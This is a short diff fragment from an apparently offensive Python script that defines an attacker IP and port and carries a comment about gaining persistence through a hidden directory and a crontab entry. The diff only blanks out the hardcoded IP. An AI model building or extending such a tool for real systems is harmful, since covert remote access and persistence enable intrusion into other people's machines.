@@ -7,7 +7,7 @@ import shutil
 import getpass
 
 # Attacker's IP and port
-ATTACKER_IP = "192.168.1.47"  # Replace with your main computer's IP
+ATTACKER_IP = ""  # Replace with your main computer's IP
 ATTACKER_PORT = 9999
 
 #establishing persistence by copying the script to a hidden directory and adding it to crontab
